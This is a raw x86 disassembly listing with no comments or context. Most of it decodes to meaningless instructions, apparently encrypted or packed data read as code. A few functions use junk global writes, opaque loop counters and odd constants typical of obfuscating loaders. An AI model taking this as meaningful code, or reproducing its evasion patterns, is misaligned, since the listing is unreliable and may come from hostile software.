  40a09c:	cmp    eax,0x86d0d45
  40a0a1:	mov    edx,0xd34f17d4
  40a0a6:	int3   
  40a0a7:	mov    BYTE PTR [edi+0x4b],dl
  40a0aa:	dec    ebx
  40a0ab:	sar    DWORD PTR [ecx+0x58],1
  40a0ae:	dec    edi
  40a0af:	xor    ecx,DWORD PTR [ecx-0x3e654f5d]
  40a0b5:	mov    DWORD PTR [esi],0xa03fb56a
  40a0bb:	jmp    0x40a09d
  40a0bd:	pop    ss
  40a0be:	jo     0x40a0fa
  40a0c0:	pop    eax
  40a0c1:	call   0x8d58:0xc224c211
  40a0c8:	shr    DWORD PTR [eax],1
  40a0ca:	cs pop ebp
  40a0cc:	mov    dh,0x3f
  40a0ce:	ret    0xbb98
  40a0d1:	arpl   WORD PTR [ecx-0x1a],dx
  40a0d4:	xchg   ebx,eax
  40a0d5:	push   0xffffffe3
  40a0d7:	arpl   WORD PTR [ebx+0x34f57169],bx
  40a0dd:	or     al,0xc7
  40a0df:	pushf  
  40a0e0:	xchg   al,dh
  40a0e2:	mov    ch,0x7d
  40a0e4:	fcomp  st(5)
  40a0e6:	fstp   QWORD PTR [eax-0x30]
  40a0e9:	push   ebx
  40a0ea:	adc    al,0x6f
  40a0ec:	imul   eax,ebp,0xffffffdf
  40a0ef:	lds    edx,FWORD PTR [ebx+0x8e41cae]
  40a0f5:	or     BYTE PTR [ebx],bh
  40a0f7:	clc    
  40a0f8:	aam    0xd4
  40a0fa:	div    BYTE PTR [ebx+ecx*1-0x1773ce43]
  40a101:	dec    edi
  40a102:	in     eax,0x27
  40a104:	pop    eax
  40a105:	ror    BYTE PTR [edx],1
  40a107:	ins    DWORD PTR es:[edi],dx
  40a108:	shl    bl,cl
  40a10a:	mov    ch,0xbe
  40a10c:	popf   
  40a10d:	xchg   ebp,eax
  40a10e:	scas   eax,DWORD PTR es:[edi]
  40a10f:	data16 aad 0x36
  40a112:	push   0x7c285d67
  40a117:	(bad)  
  40a11b:	cmc    
  40a11c:	(bad)  
  40a11e:	jne    0x40a0ec
  40a120:	rcl    DWORD PTR [eax+0x2],0xab
  40a124:	stos   DWORD PTR es:[edi],eax
  40a125:	ret    0x4168
  40a128:	test   al,0xa8
  40a12a:	loope  0x40a145
  40a12c:	mov    cl,0x77
  40a12e:	pop    edx
  40a12f:	pop    DWORD PTR [edx+0x546d197e]
  40a135:	mov    ah,0xdb
  40a137:	mov    al,ds:0x4e7edc32
  40a13c:	in     al,dx
  40a13d:	ss scas al,BYTE PTR es:[edi]
  40a13f:	pop    es
  40a140:	xchg   ebp,eax
  40a141:	xlat   BYTE PTR fs:[ebx]
  40a143:	into   
  40a144:	or     bh,BYTE PTR [ecx+0x7c]
  40a147:	(bad)  
  40a148:	je     0x40a11a
  40a14a:	dec    ebp
  40a14b:	stos   BYTE PTR es:[edi],al
  40a14c:	je     0x40a0ec
  40a14e:	sar    DWORD PTR [eax+ebp*1-0x3d],1
  40a152:	mov    edx,0xd1b45f45
  40a157:	mov    gs,WORD PTR [esi-0x4c]
  40a15a:	sbb    BYTE PTR [ebp-0x37],bh
  40a15d:	call   0x75f9ec29
  40a162:	jb     0x40a106
  40a164:	lds    ebp,FWORD PTR [edi-0x10]
  40a167:	jmp    0x33553464
  40a16c:	fisubr DWORD PTR [esi]
  40a16e:	cmp    DWORD PTR [edi-0x12],esp
  40a171:	cmp    DWORD PTR [edi],ebx
  40a173:	mov    al,ds:0x7d5d1836
  40a178:	outs   dx,BYTE PTR ds:[esi]
  40a179:	fwait
  40a17a:	xchg   esp,eax
  40a17b:	xchg   esp,eax
  40a17c:	jl     0x40a11a
  40a17e:	pop    esp
  40a17f:	not    DWORD PTR [edi+0x12420239]
  40a185:	push   edx
  40a186:	scas   eax,DWORD PTR es:[edi]
  40a187:	mov    dl,0x98
  40a189:	mov    WORD PTR [edi],ss
  40a18b:	sbb    ebp,DWORD PTR [edi-0x2b]
  40a18e:	fimul  WORD PTR [edi]
  40a190:	in     eax,dx
  40a191:	ins    BYTE PTR es:[edi],dx
  40a192:	loop   0x40a127
  40a194:	cwde   
  40a195:	pop    es
  40a196:	into   
  40a197:	imul   esp
  40a199:	pop    ebx
  40a19a:	xlat   BYTE PTR ds:[ebx]
  40a19b:	fwait
  40a19c:	stc    
  40a19d:	inc    esi
  40a19e:	imul   edx,DWORD PTR [eax+0x67],0x5d
  40a1a2:	hlt    
  40a1a3:	pop    edx
  40a1a4:	mov    esi,0xfeb05568
  40a1a9:	mov    al,0x3d
  40a1ab:	and    esi,DWORD PTR ds:0x756f8483
  40a1b1:	arpl   dx,si
  40a1b3:	mov    ch,0xbb
  40a1b5:	mov    edx,0xb59a437e
  40a1ba:	sbb    ch,BYTE PTR [ecx-0x3c3863df]
  40a1c0:	push   ss
  40a1c1:	bound  esp,QWORD PTR [ebp+ebx*1-0x7acf8341]
  40a1c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1c9:	jb     0x40a1eb
  40a1cb:	adc    eax,0xa85cdcf5
  40a1d0:	pushf  
  40a1d1:	adc    eax,0xd5ee058a
  40a1d6:	push   ds
  40a1d7:	imul   ebp,DWORD PTR [ecx-0x5fa24a47],0x4982ef4a
  40a1e1:	or     BYTE PTR [edi-0x17],dh
  40a1e4:	dec    ebp
  40a1e5:	sub    eax,0xc03d3594
  40a1ea:	mov    ds:0xf58c72b4,eax
  40a1ef:	mov    ebp,0x47dbe0b
  40a1f4:	fwait
  40a1f5:	in     al,0x1e
  40a1f7:	mov    esi,0xe0fda50e
  40a1fc:	iret   
  40a1fd:	cmp    esi,eax
  40a1ff:	jne    0x40a21b
  40a205:	mov    eax,DWORD PTR [ebp-0x4]
  40a208:	mov    esi,DWORD PTR [ebp-0x8]
  40a20b:	xor    eax,edx
  40a20d:	xor    esi,edx
  40a20f:	add    eax,ecx
  40a211:	add    esi,ecx
  40a213:	imul   eax,esi
  40a216:	jmp    0x40a256
  40a21b:	mov    eax,DWORD PTR [ebp+0xc]
  40a21e:	mov    eax,DWORD PTR [eax+0x78]
  40a221:	mov    DWORD PTR [ebp+0xc],eax
  40a224:	mov    eax,DWORD PTR [ebp-0x4]
  40a227:	mov    esi,DWORD PTR [ebp-0x8]
  40a22a:	xor    eax,edx
  40a22c:	xor    esi,edx
  40a22e:	add    eax,ecx
  40a230:	add    esi,ecx
  40a232:	imul   eax,esi
  40a235:	mov    esi,DWORD PTR [ebp+0xc]
  40a238:	cmp    esi,eax
  40a23a:	mov    eax,DWORD PTR [ebp-0x4]
  40a23d:	je     0x40a208
  40a243:	xor    eax,edx
  40a245:	add    eax,ecx
  40a247:	mov    ecx,DWORD PTR [ebp+0xc]
  40a24a:	imul   eax,ecx
  40a24d:	add    eax,DWORD PTR [ebp+0x8]
  40a250:	mov    DWORD PTR [ebp+0xc],eax
  40a253:	mov    eax,DWORD PTR [ebp+0xc]
  40a256:	pop    esi
  40a257:	leave  
  40a258:	ret    0x8
  40a25b:	push   ebp
  40a25c:	mov    ebp,esp
  40a25e:	sub    esp,0x10
  40a261:	sbb    eax,DWORD PTR ds:0x413c88
  40a267:	mov    eax,0xf89c85b0
  40a26c:	xor    edx,edx
  40a26e:	xor    edx,DWORD PTR ds:0x414014
  40a274:	sub    DWORD PTR ds:0x413cf4,edx
  40a27a:	mov    DWORD PTR [ebp-0x4],eax
  40a27d:	add    ecx,ecx
  40a27f:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40a286:	or     DWORD PTR ds:0x414014,edi
  40a28c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a28f:	push   esi
  40a290:	mov    edx,0x7510894
  40a295:	add    esi,0x25d7
  40a29b:	xor    ecx,edx
  40a29d:	mov    DWORD PTR ds:0x413d30,0x18
  40a2a7:	cmp    DWORD PTR ds:0x413d30,0x0
  40a2ae:	je     0x40a2e4
  40a2b4:	cmp    DWORD PTR ds:0x413d30,0x19
  40a2bb:	jne    0x40a2cc
  40a2c1:	push   0x413ce8
  40a2c6:	call   DWORD PTR ds:0x41679c
  40a2cc:	mov    esi,DWORD PTR ds:0x413d30
  40a2d2:	dec    esi
  40a2d3:	mov    DWORD PTR ds:0x413d30,esi
  40a2d9:	jmp    0x40a2a7
  40a2de:	add    esi,DWORD PTR ds:0x413d24
  40a2e4:	mov    esi,0x3272dc
  40a2e9:	neg    DWORD PTR ds:0x413d24
  40a2ef:	push   edi
  40a2f0:	mov    edi,DWORD PTR [ebp+0x10]
  40a2f3:	adc    DWORD PTR ds:0x414008,0x741e
  40a2fd:	add    ecx,esi
  40a2ff:	cmp    ecx,edi
  40a301:	mov    DWORD PTR ds:0x413c80,0x1b1e
  40a30b:	je     0x40a474
  40a311:	mov    ecx,DWORD PTR [ebp-0x4]
  40a314:	mov    edi,DWORD PTR [ebp+0x10]
  40a317:	xor    eax,eax
  40a319:	xor    ecx,edx
  40a31b:	adc    DWORD PTR ds:0x413d2c,0x414008
  40a325:	add    ecx,esi
  40a327:	add    edi,0xfabdbeef
  40a32d:	adc    eax,0xffffffff
  40a330:	neg    DWORD PTR ds:0x413c88
  40a336:	xor    eax,0x0
  40a339:	mov    DWORD PTR [ebp-0xc],eax
  40a33c:	push   ebx
  40a33d:	movzx  eax,BYTE PTR ds:0x413d30
  40a344:	adc    DWORD PTR ds:0x414018,eax
  40a34a:	xor    ebx,ebx
  40a34c:	xor    edi,0x8a29a125
  40a352:	mov    eax,ds:0x413c12
  40a357:	and    DWORD PTR ds:0x413cdc,eax
  40a35d:	mov    eax,ecx
  40a35f:	add    eax,0xfabdbeef
  40a364:	mov    DWORD PTR ds:0x413c6c,0x7b3
  40a36e:	adc    ebx,0xffffffff
  40a371:	add    DWORD PTR ds:0x413c88,0x414018
  40a37b:	xor    eax,0x8a29a125
  40a380:	mov    DWORD PTR ds:0x413d18,0x6932
  40a38a:	xor    ebx,0x0
  40a38d:	mov    DWORD PTR ds:0x413cd8,0x53fd
  40a397:	cmp    eax,edi
  40a399:	mov    DWORD PTR ds:0x413c88,0x1215
  40a3a3:	jne    0x40a3c6
  40a3a9:	mov    DWORD PTR ds:0x413c16,0x2565
  40a3b3:	cmp    ebx,DWORD PTR [ebp-0xc]
  40a3b6:	je     0x40a46e
  40a3bc:	jmp    0x40a3c6
  40a3c1:	mov    esi,0x3272dc
  40a3c6:	and    DWORD PTR ds:0x413d30,0x0
  40a3d0:	xor    eax,eax
  40a3d2:	xor    eax,DWORD PTR ds:0x413d30
  40a3d8:	inc    eax
  40a3d9:	mov    ds:0x413d30,eax
  40a3de:	cmp    DWORD PTR ds:0x413d30,0x26
  40a3e5:	jne    0x40a3f9
  40a3eb:	push   0x413d20
  40a3f0:	push   DWORD PTR [ebp-0x10]
  40a3f3:	call   DWORD PTR ds:0x41675c
  40a3f9:	cmp    DWORD PTR ds:0x413d30,0x1f
  40a400:	jb     0x40a3d0
  40a406:	mov    eax,DWORD PTR [ebp-0x4]
  40a409:	mov    edi,DWORD PTR [ebp-0x8]
  40a40c:	xor    edi,edx
  40a40e:	add    edi,esi
  40a410:	mov    esi,DWORD PTR [ebp+0x8]
  40a413:	imul   edi,ecx
  40a416:	mov    ebx,DWORD PTR [ebp+0xc]
  40a419:	xor    eax,edx
  40a41b:	add    eax,ecx
  40a41d:	mov    al,BYTE PTR [ebx+eax*1+0x3272dc]
  40a424:	mov    BYTE PTR [edi+esi*1],al
  40a427:	mov    eax,DWORD PTR [ebp-0x8]
  40a42a:	mov    esi,DWORD PTR [ebp+0x10]
  40a42d:	xor    eax,edx
  40a42f:	xor    ebx,ebx
  40a431:	add    esi,0xfabdbeef
  40a437:	adc    ebx,0xffffffff
  40a43a:	lea    ecx,[ecx+eax*1+0x3272dc]
  40a441:	xor    edi,edi
  40a443:	xor    esi,0x8a29a125
  40a449:	xor    ebx,0x0
  40a44c:	mov    eax,ecx
  40a44e:	add    eax,0xfabdbeef
  40a453:	adc    edi,0xffffffff
  40a456:	xor    eax,0x8a29a125
  40a45b:	xor    edi,0x0
  40a45e:	cmp    eax,esi
  40a460:	jne    0x40a3c1
  40a466:	cmp    edi,ebx
  40a468:	jne    0x40a3c1
  40a46e:	mov    eax,0xf89c85b1
  40a473:	pop    ebx
  40a474:	pop    edi
  40a475:	pop    esi
  40a476:	leave  
  40a477:	ret    0xc
  40a47a:	push   ebp
  40a47b:	mov    ebp,esp
  40a47d:	sub    esp,0xa4
  40a483:	sbb    DWORD PTR ds:0x413cf4,0x6aac
  40a48d:	mov    ecx,DWORD PTR [ebp+0x8]
  40a490:	and    DWORD PTR ds:0x414008,0x0
  40a49a:	mov    eax,ds:0x414008
  40a49f:	inc    eax
  40a4a0:	mov    ds:0x414008,eax
  40a4a5:	cmp    DWORD PTR ds:0x414008,0x6
  40a4ac:	jne    0x40a4c5
  40a4b2:	push   DWORD PTR [ebp-0x18]
  40a4b5:	push   0x41401c
  40a4ba:	push   0x1f9d
  40a4bf:	call   DWORD PTR ds:0x416760
  40a4c5:	cmp    DWORD PTR ds:0x414008,0x5
  40a4cc:	jne    0x40a4dd
  40a4d2:	mov    eax,ds:0x414008
  40a4d7:	inc    eax
  40a4d8:	mov    ds:0x414008,eax
  40a4dd:	cmp    DWORD PTR ds:0x414008,0x1b
  40a4e4:	jb     0x40a49a
  40a4ea:	mov    DWORD PTR ds:0x41401c,0x17
  40a4f4:	cmp    DWORD PTR ds:0x41401c,0x0
  40a4fb:	je     0x40a54c
  40a501:	cmp    DWORD PTR ds:0x41401c,0x6
  40a508:	jne    0x40a524
  40a50e:	push   DWORD PTR [ebp-0x24]
  40a511:	push   0x3b56
  40a516:	push   DWORD PTR [ebp-0x1c]
  40a519:	push   0x73b3
  40a51e:	call   DWORD PTR ds:0x416764
  40a524:	cmp    DWORD PTR ds:0x41401c,0x7
  40a52b:	jne    0x40a53c
  40a531:	mov    eax,ds:0x41401c
  40a536:	dec    eax
  40a537:	mov    ds:0x41401c,eax
  40a53c:	mov    eax,ds:0x41401c
  40a541:	dec    eax
  40a542:	mov    ds:0x41401c,eax
  40a547:	jmp    0x40a4f4
  40a54c:	mov    eax,0x8a87
  40a551:	xor    ax,WORD PTR [ecx+0x20]
  40a555:	not    DWORD PTR ds:0x413cf4
  40a55b:	mov    ecx,0x3b4a
  40a560:	adc    DWORD PTR ds:0x413c0a,0x414008
  40a56a:	add    ax,cx
  40a56d:	movzx  eax,ax
  40a570:	mov    DWORD PTR [ebp-0x18],eax
  40a573:	mov    ecx,DWORD PTR ds:0x413c78
  40a579:	sbb    DWORD PTR ds:0x413d28,ecx
  40a57f:	mov    BYTE PTR [ebp-0x1],0x7d
  40a583:	add    ecx,DWORD PTR ds:0x414000
  40a589:	lea    eax,[ebp-0x1]
  40a58c:	xor    DWORD PTR ds:0x413c78,ecx
  40a592:	mov    DWORD PTR [ebp-0x10],eax
  40a595:	add    DWORD PTR ds:0x413d1c,0x4151
  40a59f:	mov    al,BYTE PTR [ebp-0x1]
  40a5a2:	mov    ecx,DWORD PTR [ebp-0x10]
  40a5a5:	or     DWORD PTR ds:0x413d20,0x66e0
  40a5af:	xor    al,0x70
  40a5b1:	and    DWORD PTR ds:0x414000,0x34d9
  40a5bb:	sub    al,0xc
  40a5bd:	and    DWORD PTR ds:0x413d1c,0x413c70
  40a5c7:	mov    BYTE PTR [ecx],al
  40a5c9:	mov    DWORD PTR [ebp-0x14],0xf89c85b0
  40a5d0:	or     DWORD PTR ds:0x413ce0,ecx
  40a5d6:	push   ebx
  40a5d7:	jmp    0x40c95f
  40a5dc:	and    ch,BYTE PTR ds:0xb393b193
  40a5e2:	add    cl,BYTE PTR [edi-0x6bf6fe89]
  40a5e8:	inc    ecx
  40a5e9:	adc    esi,DWORD PTR [edi-0x5a]
  40a5ec:	daa    
  40a5ed:	push   es
  40a5ee:	jl     0x40a66c
  40a5f0:	pop    es
  40a5f1:	pop    edi
  40a5f2:	jl     0x40a670
  40a5f4:	cdq    
  40a5f5:	sbb    BYTE PTR [ecx],dl
  40a5f7:	(bad)  
  40a5f8:	push   cs
  40a5f9:	fild   DWORD PTR [edx+0x7170b2b0]
  40a5ff:	inc    edx
  40a600:	inc    ebp
  40a601:	cmp    al,0xb4
  40a603:	mov    WORD PTR [edi],cs
  40a605:	cmc    
  40a606:	imul   ebp,DWORD PTR ss:[eax],0x8a5278e5
  40a60d:	push   edi
  40a60e:	bound  ebx,QWORD PTR [edx-0x62]
  40a611:	stos   DWORD PTR es:[edi],eax
  40a612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a613:	jmp    0x40a5f4
  40a615:	rcl    DWORD PTR [eax+0x320f5bcb],cl
  40a61b:	jb     0x40a645
  40a61d:	clc    
  40a61e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a61f:	push   esi
  40a620:	sub    al,0x56
  40a622:	add    eax,0x7558c50f
  40a627:	adc    BYTE PTR [edx-0x42ee60c7],bh
  40a62d:	in     al,0xb4
  40a62f:	arpl   WORD PTR [esp+ecx*2-0x13],bp
  40a633:	and    dl,BYTE PTR [ebp+0x7a2b038]
  40a639:	jb     0x40a675
  40a63b:	ret    
  40a63c:	int3   
  40a63d:	outs   dx,DWORD PTR ds:[esi]
  40a63e:	inc    esp
  40a63f:	sbb    eax,0xd99b8696
  40a644:	pop    eax
  40a645:	pop    ebx
  40a646:	lea    ecx,[edx+edi*8+0x2f]
  40a64a:	xchg   edi,eax
  40a64b:	xchg   edx,eax
  40a64c:	or     BYTE PTR [ecx],cl
  40a64e:	test   eax,0x5d1a6a7e
  40a653:	repnz fwait
  40a655:	addr16 aaa 
  40a657:	fstp   TBYTE PTR [edx+0xba73ee8]
  40a65d:	pop    esp
  40a65e:	add    ebx,DWORD PTR [edx]
  40a660:	div    DWORD PTR [esi]
  40a662:	mov    eax,0x11d70033
  40a667:	loop   0x40a638
  40a669:	sbb    DWORD PTR [ebx-0x71],ebp
  40a66c:	fxam   
  40a66e:	inc    esp
  40a66f:	(bad)  
  40a670:	out    dx,eax
  40a671:	lock test BYTE PTR [ebp+0x1c],dh
  40a675:	jae    0x40a68f
  40a677:	xlat   BYTE PTR ds:[ebx]
  40a678:	xor    edx,DWORD PTR [ebx-0x3dca3f61]
  40a67e:	add    ecx,ebp
  40a680:	aaa    
  40a681:	call   DWORD PTR gs:[edi-0x37]
  40a685:	gs jmp 0x40a6f3
  40a688:	clc    
  40a689:	shr    BYTE PTR [edi],0xc5
  40a68c:	mov    edx,0xef1284c
  40a691:	es push 0x6f
  40a694:	setp   BYTE PTR [ecx-0x1a1314d5]
  40a69b:	data16 aam 0xed
  40a69e:	inc    edi
  40a69f:	jnp    0x40a687
  40a6a1:	cmp    eax,DWORD PTR [esi-0x1c]
  40a6a4:	sbb    ebx,DWORD PTR [ebx+0x34]
  40a6a7:	cs fninit 
  40a6aa:	shl    ebx,1
  40a6ac:	aas    
  40a6ad:	stos   BYTE PTR es:[edi],al
  40a6ae:	jb     0x40a63f
  40a6b0:	push   0x619a47fa
  40a6b5:	jae    0x40a720
  40a6b7:	pop    edi
  40a6b8:	jae    0x40a64f
  40a6ba:	mov    edi,0x3d5288ca
  40a6bf:	pop    ss
  40a6c0:	(bad)  
  40a6c1:	int    0x72
  40a6c3:	jp     0x40a6ef
  40a6c5:	xor    ebp,DWORD PTR [esp+esi*4]
  40a6c8:	xchg   esp,eax
  40a6c9:	pop    esp
  40a6ca:	mov    edx,0x1bd3fde0
  40a6cf:	fisub  WORD PTR [eax-0x391a387e]
  40a6d5:	and    ah,BYTE PTR [eax]
  40a6d7:	jmp    0xd47:0xaa35664a
  40a6de:	xchg   ebp,eax
  40a6df:	push   0x99d000c0
  40a6e4:	adc    eax,0xef020b9
  40a6e9:	test   eax,0xa20189b
  40a6ee:	push   ecx
  40a6ef:	std    
  40a6f0:	xchg   edi,eax
  40a6f1:	push   edi
  40a6f2:	add    edi,DWORD PTR [eax]
  40a6f4:	mov    dl,dh
  40a6f6:	fnstcw WORD PTR [edi-0x79]
  40a6f9:	push   edx
  40a6fa:	or     ecx,edx
  40a6fc:	(bad)  
  40a6fd:	adc    eax,0xf2f843b8
  40a702:	ja     0x40a6ee
  40a704:	xor    BYTE PTR [eax+0x5e],0x4e
  40a708:	test   eax,0x48ddc7e7
  40a70d:	mov    ebx,0x52f5041d
  40a712:	mov    al,ds:0xf3740f24
  40a717:	or     eax,0x1ff6df55
  40a71c:	std    
  40a71d:	push   ebx
  40a71e:	jmp    0x64ba:0x8ffc0f22
  40a725:	iret   
  40a726:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a727:	adc    al,bh
  40a729:	and    dl,BYTE PTR [eax]
  40a72b:	bound  esi,QWORD PTR [ebp+0x684e0364]
  40a731:	fiadd  DWORD PTR [esp+ebp*2]
  40a734:	sub    edx,eax
  40a736:	call   0xf61e:0xef12196d
  40a73d:	dec    edx
  40a73e:	outs   dx,DWORD PTR ds:[esi]
  40a73f:	(bad)  
  40a740:	popf   
  40a741:	dec    esi
  40a742:	or     BYTE PTR [ebp+ebp*4-0x772f293a],bh
  40a749:	xchg   ebp,eax
  40a74a:	mov    edx,DWORD PTR [eax+0x44]
  40a74d:	mov    ecx,0x1beb4d27
  40a752:	pop    edx
  40a753:	cmp    DWORD PTR [eax+0x7f28d3c5],esp
  40a759:	cld    
  40a75a:	inc    edx
  40a75b:	dec    ecx
  40a75c:	xlat   BYTE PTR ds:[ebx]
  40a75d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a75e:	imul   edi,DWORD PTR [eax+0x36],0x37
  40a762:	les    ecx,FWORD PTR [esi+0x2dbb2617]
  40a768:	(bad)  
  40a769:	push   esi
  40a76a:	xchg   esp,eax
  40a76b:	jbe    0x40a781
  40a76d:	pop    es
  40a76e:	jbe    0x40a6ff
  40a770:	out    0xc,al
  40a772:	pushf  
  40a773:	imul   eax,DWORD PTR [esi+0x73],0xffffffb2
  40a777:	mov    bl,0xee
  40a779:	push   esi
  40a77a:	cld    
  40a77b:	push   di
  40a77d:	in     eax,0xc4
  40a77f:	add    al,0xca
  40a781:	sub    ch,BYTE PTR [esi+0x1f]
  40a784:	pop    ds
  40a785:	mov    esi,0x774ada38
  40a78a:	or     ebp,DWORD PTR [esi-0x35e0f3d8]
  40a790:	and    al,0xb4
  40a792:	sub    bh,dl
  40a794:	or     BYTE PTR [esi+0x7b],al
  40a797:	cmp    DWORD PTR [ecx+0x5503de1a],0x9
  40a79e:	gs xchg ebp,eax
  40a7a0:	mov    esi,0x71c2e1fb
  40a7a5:	shr    BYTE PTR [eax-0xe861ca],1
  40a7ab:	call   0xb898:0xcb872932
  40a7b2:	adc    DWORD PTR [edx+0x42011d74],eax
  40a7b8:	dec    ecx
  40a7b9:	push   ds
  40a7ba:	sbb    eax,0xaae589f5
  40a7bf:	je     0x40a7dd
  40a7c1:	dec    esp
  40a7c2:	lock dec esp
  40a7c4:	inc    edi
  40a7c5:	dec    esi
  40a7c6:	mov    bh,0x72
  40a7c8:	in     al,dx
  40a7c9:	mov    dl,BYTE PTR [esi]
  40a7cb:	pop    ebp
  40a7cc:	xchg   edi,eax
  40a7cd:	aas    
  40a7ce:	vmaxps xmm1{k6}{z},xmm5,xmm1
  40a7d4:	pop    ds
  40a7d5:	pop    ebp
  40a7d6:	ja     0x40a7be
  40a7d8:	lods   eax,DWORD PTR ds:[esi]
  40a7d9:	mov    fs,WORD PTR [ebx-0x48d54807]
  40a7df:	add    ebp,DWORD PTR ds:0xd068cd11
  40a7e5:	inc    ebx
  40a7e6:	in     al,dx
  40a7e7:	ss jo  0x40a76d
  40a7ea:	sbb    DWORD PTR [ecx-0x2b],ebp
  40a7ed:	pop    ebx
  40a7ee:	call   0xe11e:0x17fe7f9a
  40a7f5:	enter  0x387e,0x0
  40a7f9:	in     eax,dx
  40a7fa:	mov    BYTE PTR [ebx],ch
  40a7fc:	sub    bh,BYTE PTR [esi]
  40a7fe:	repnz cmp eax,0x4ed225ec
  40a804:	mov    ebp,0xdf489e1f
  40a809:	ins    BYTE PTR es:[edi],dx
  40a80a:	test   eax,0x84d1b593
  40a80f:	rcr    BYTE PTR [esp+ecx*8+0x44],0xb8
  40a814:	int3   
  40a815:	push   esi
  40a816:	cwde   
  40a817:	retf   0x56f2
  40a81a:	cmp    DWORD PTR [ecx+edi*4],eax
  40a81d:	mov    dl,BYTE PTR [edi+0x26]
  40a820:	mov    ds:0x8f2b6957,al
  40a825:	outs   dx,BYTE PTR ds:[esi]
  40a826:	ds push 0x22
  40a829:	clc    
  40a82a:	sub    BYTE PTR [ecx],ch
  40a82c:	adc    al,cl
  40a82e:	sub    al,ch
  40a830:	push   ecx
  40a831:	sub    esi,0x6be78280
  40a837:	(bad)  
  40a838:	leave  
  40a839:	add    ebx,DWORD PTR [esi-0x318dcd91]
  40a83f:	xor    dh,BYTE PTR [edi]
  40a841:	nop
  40a842:	jle    0x40a870
  40a844:	pop    ebp
  40a845:	mov    ebx,0x27dab545
  40a84a:	pop    ebp
  40a84b:	pop    edi
  40a84c:	mov    ds:0xc183d070,al
  40a851:	sub    esp,edx
  40a853:	in     al,0xd3
  40a855:	nop
  40a856:	fcomp  QWORD PTR [eax-0x31e77bd5]
  40a85c:	dec    esp
  40a85d:	fsubr  DWORD PTR ds:0x3d2b39a9
  40a863:	jg     0x40a825
  40a865:	aaa    
  40a866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a867:	xchg   esi,eax
  40a868:	ins    DWORD PTR es:[edi],dx
  40a869:	cmp    BYTE PTR [ecx],dl
  40a86b:	sti    
  40a86c:	cmp    eax,0xc5e46b97
  40a871:	mov    esi,DWORD PTR [edi-0x63419974]
  40a877:	jmp    0x40a87e
  40a879:	scas   eax,DWORD PTR es:[edi]
  40a87a:	sub    al,0x7c
  40a87c:	scas   al,BYTE PTR es:[edi]
  40a87d:	mov    BYTE PTR [edx+ebx*8],0x78
  40a881:	sbb    BYTE PTR [esi-0x39],bh
  40a884:	cmp    ch,BYTE PTR [ecx-0x7f]
  40a887:	loope  0x40a829
  40a889:	mov    eax,ds:0xa3a923c7
  40a88e:	in     al,0x34
  40a890:	xchg   ebx,eax
  40a891:	inc    esi
  40a892:	adc    ebp,edi
  40a894:	jae    0x40a81e
  40a896:	aam    0x78
  40a898:	stos   DWORD PTR es:[edi],eax
  40a899:	ins    DWORD PTR es:[edi],dx
  40a89a:	pop    edi
  40a89b:	scas   al,BYTE PTR es:[edi]
  40a89c:	ds cwde 
  40a89e:	mov    al,0x3b
  40a8a0:	sbb    cl,BYTE PTR [edx]
  40a8a2:	pusha  
  40a8a3:	mov    ebp,0x4a4e5249
  40a8a8:	lahf   
  40a8a9:	out    0xbb,al
  40a8ab:	pop    ds
  40a8ac:	fst    DWORD PTR [ecx+0x2e7875a3]
  40a8b2:	sar    bh,cl
  40a8b4:	int    0x24
  40a8b6:	aas    
  40a8b7:	xor    al,0x51
  40a8b9:	jne    0x40a898
  40a8bb:	pop    esp
  40a8bc:	mov    bh,0x4e
  40a8be:	scas   al,BYTE PTR es:[edi]
  40a8bf:	mov    eax,ds:0x8ddab47b
  40a8c4:	push   0xffffffb5
  40a8c6:	cmp    esp,ebp
  40a8c8:	pop    eax
  40a8c9:	push   esi
  40a8ca:	push   es
  40a8cb:	push   0x6e
  40a8cd:	es add eax,ecx
  40a8d0:	sub    al,0x2f
  40a8d2:	add    esp,DWORD PTR [ebx-0x60]
  40a8d5:	leave  
  40a8d6:	xor    cl,BYTE PTR [edx-0x1f1f3958]
  40a8dc:	fsubp  st(1),st
  40a8de:	mov    al,0x6b
  40a8e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8e1:	test   al,0x4e
  40a8e3:	jmp    0xc582:0xfa5ff859
  40a8ea:	pop    ss
  40a8eb:	ds mov ah,ah
  40a8ee:	lea    edx,[ebx-0x3a]
  40a8f1:	adc    DWORD PTR [eax],ebp
  40a8f3:	xchg   ecx,eax
  40a8f4:	mov    ecx,0xef35734e
  40a8f9:	xchg   ebp,eax
  40a8fa:	adc    eax,0xcdde7b7c
  40a8ff:	test   al,0x54
  40a901:	push   ss
  40a902:	shl    BYTE PTR [eax-0x34],1
  40a905:	push   eax
  40a906:	mov    BYTE PTR [eax-0x51],ah
  40a909:	(bad)  [edi+0x2427771d]
  40a90f:	xchg   ecx,eax
  40a910:	sbb    eax,0x350956e3
  40a915:	out    dx,eax
  40a916:	cmp    BYTE PTR ds:0xaab8997b,dh
  40a91c:	xor    BYTE PTR [edi],ah
  40a91e:	adc    esi,DWORD PTR [esi+0x35afaaf8]
  40a924:	ss dec ecx
  40a926:	mov    ds:0xa7231de8,eax
  40a92b:	push   es
  40a92c:	cmp    eax,0x7562f52e
  40a931:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a932:	jno    0x40a8e5
  40a934:	lods   eax,DWORD PTR ds:[esi]
  40a935:	fst    QWORD PTR [eax+eiz*1+0x78a6a8ff]
  40a93c:	imul   eax,DWORD PTR [ebx-0x26],0xed3a1fbf
  40a943:	mov    ecx,0x89b068a5
  40a948:	popa   
  40a949:	clc    
  40a94a:	mov    ah,0x43
  40a94c:	pop    es
  40a94d:	mov    dh,0x42
  40a94f:	mov    esi,0xa53ce5cf
  40a954:	and    ebx,DWORD PTR [ebx+0x75a8647c]
  40a95a:	mov    eax,0x4c69289
  40a95f:	call   0x1274:0xd0bd9060
  40a966:	(bad)  
  40a967:	lods   al,BYTE PTR ds:[esi]
  40a968:	adc    DWORD PTR [esi],esi
  40a96a:	and    esp,DWORD PTR [esi]
  40a96c:	jbe    0x40a917
  40a96e:	dec    edi
  40a96f:	shr    DWORD PTR [ecx],0x6d
  40a972:	test   BYTE PTR [ebp+0x6b],ch
